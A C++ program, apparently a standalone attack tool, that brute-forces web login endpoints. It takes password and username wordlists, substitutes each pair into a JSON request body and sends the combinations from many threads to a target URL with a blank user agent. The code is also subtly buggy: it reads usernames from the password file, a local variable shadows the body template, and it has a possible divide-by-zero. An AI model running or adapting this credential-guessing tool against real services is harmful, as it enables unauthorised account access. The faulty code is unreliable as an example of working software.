#include <string>
#include <sstream>
#include <iostream>
#include <thread>
#include <unistd.h>
#include <chrono>
#include <vector>
#include <mutex>
#include <fstream>
#include <math.h>
#include <algorithm>

#include <curlpp/cURLpp.hpp>
#include <curlpp/Easy.hpp>
#include <curlpp/Options.hpp>

int RequestsMade = 0;
int ThreadCount = std::thread::hardware_concurrency();
std::mutex mtx;
std::string url;
std::string bodyTemplate;

struct Payload
{
	std::string username;
	std::string password;

	Payload(std::string _username, std::string _password)
	{
		this->username = _username;
		this->password = _password;
	};
};
std::vector<Payload> payloads;

size_t WriteStringCallback(char *ptr, size_t size, size_t nmemb)
{
	std::string data = std::string(ptr, size * nmemb);
	int totalSize = size * nmemb;
	std::cout << "DATA:  " << data << std::endl;
	return totalSize;
}

std::string buildTime(int s)
{
	int hours = floor((s / 60) / 60);
	int minutes = (int)(floor(s / 60)) % 60;
	int seconds = (int)s % 60;

	std::string time = "";
	if (hours < 10)
		time.append("0");
	time.append(std::to_string(hours));
	time.append(":");
	if (minutes < 10)
		time.append("0");
	time.append(std::to_string(minutes));
	time.append(":");
	if (seconds < 10)
		time.append("0");
	time.append(std::to_string(seconds));
	return time;
}

std::string passInParameters(std::string string, Payload payload)
{
	std::string result = string;
	std::size_t userPos = string.find("^USER^");
	if (userPos != std::string::npos)
	{
		result = result.replace(userPos, 6, payload.username);
	}

	std::size_t passPos = result.find("^PASS^");
	if (passPos != std::string::npos)
	{
		result = result.replace(passPos, 6, payload.password);
	}
	return result;
}

std::vector<std::string> getFileLines(std::string filePath)
{
	std::vector<std::string> lines;
	std::ifstream file;
	file.open(filePath);

	std::string currentLine;
	while (std::getline(file, currentLine))
	{
		lines.push_back(currentLine);
	}
	file.close();
	return lines;
}

void thread_function()
{
	cURLpp::Easy handle;
	std::ostringstream os;
	cURLpp::options::WriteStream ws(&os);
	handle.setOpt(ws);
	curlpp::options::WriteFunction wf(WriteStringCallback);
	handle.setOpt(wf);
	std::list<std::string> header;
	header.push_back("Content-Type: application/json");
	std::string cookies = "";
	std::string body = "";

	while (!payloads.empty())
	{
		mtx.lock();
		Payload payload = payloads.back();
		payloads.pop_back();
		RequestsMade++;
		mtx.unlock();
		body = passInParameters(bodyTemplate, payload);
		handle.setOpt<cURLpp::options::Url>(url);
		handle.setOpt<cURLpp::options::HttpHeader>(header);
		handle.setOpt<cURLpp::options::CookieList>(cookies);
		handle.setOpt<cURLpp::options::PostFields>(body);
		handle.setOpt<cURLpp::options::PostFieldSize>(body.length());
		handle.setOpt<cURLpp::options::UserAgent>("");
		handle.perform();
		os.clear();
	}
}

int main(int argc, char *argv[])
{
	url = argv[1];
	std::string passwordListPath = argv[2];
	std::string usernameListPath = argv[3];
	std::string bodyTemplate = argv[4];
	ThreadCount = std::stoi(argv[5]);

	std::cout << "Reading " << passwordListPath << std::endl;
	std::vector<std::string> passwords = getFileLines(passwordListPath);

	std::cout << "Reading " << usernameListPath << std::endl;
	std::vector<std::string> usernames = getFileLines(passwordListPath);
	while (!usernames.empty())
	{
		std::string username = usernames.back();
		for (std::string password : passwords)
		{
			payloads.push_back(Payload(username, password));
		}
		usernames.pop_back();
	}
	passwords.clear();
	usernames.clear();
	std::cout << payloads.size() << " payloads created and shuffled." << std::endl;

	std::cout << "Starting " << ThreadCount << " threads" << std::endl;
	auto start = std::chrono::system_clock::now();

	cURLpp::initialize();
	std::vector<std::thread> pool(ThreadCount);
	for (int i = 0; i < ThreadCount; i++)
	{
		pool.at(i) = std::thread(thread_function);
		pool.at(i).detach();
	}

	sleep(1);
	int previousRequests = 0;
	while (!payloads.empty())
	{
		int requestsPerSecond = RequestsMade - previousRequests;
		double secondsRemaining = (payloads.size() - RequestsMade) / requestsPerSecond;
		std::string eta = buildTime(secondsRemaining);

		std::cout << "Requests p/s " << requestsPerSecond << "s"
				  << " | " << RequestsMade << "/" << payloads.size() << "| ETA: " << eta << "\r";
		std::cout.flush();
		previousRequests = RequestsMade;
		sleep(1);
	}

	auto end = std::chrono::system_clock::now();
	std::chrono::duration<double> elapsed_seconds = end - start;
	std::cout << RequestsMade << " requests made in " << elapsed_seconds.count() << "s" << std::endl;

	cURLpp::terminate();

	return 0;
}